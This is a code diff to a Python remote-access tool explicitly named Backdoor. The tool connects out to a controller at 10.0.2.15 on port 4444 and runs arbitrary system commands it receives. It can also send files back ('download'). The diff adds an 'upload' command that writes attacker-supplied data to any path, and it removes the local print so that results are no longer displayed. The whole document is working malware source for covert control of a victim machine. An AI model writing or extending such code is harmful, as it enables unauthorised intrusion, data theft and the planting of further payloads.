@@ -33,6 +33,11 @@ class Backdoor:
 		with open(path, "rb") as file:
 			return base64.b64encode(file.read())		# turn unknown into known
 
+	def write_file(self, path, content):
+		with open(path, "wb") as file:
+			file.write(base64.b64decode(content))
+			return "[+] Upload successful."
+
 # time.sleep(10)
 	def run(self):
 		while True:
@@ -44,9 +49,10 @@ class Backdoor:
 				command_result = self.change_working_directory_to(command[1])
 			elif command[0] == "download":
 				command_result = self.read_file(command[1])
+			elif command[0] == "upload":
+				command_result = self.write_file(command[1], command[2])
 			else:
 				command_result = self.execute_system_command(command) 
-			print(command_result)
 			self.reliable_send(command_result)
 		
 my_backdoor = Backdoor("10.0.2.15", 4444)
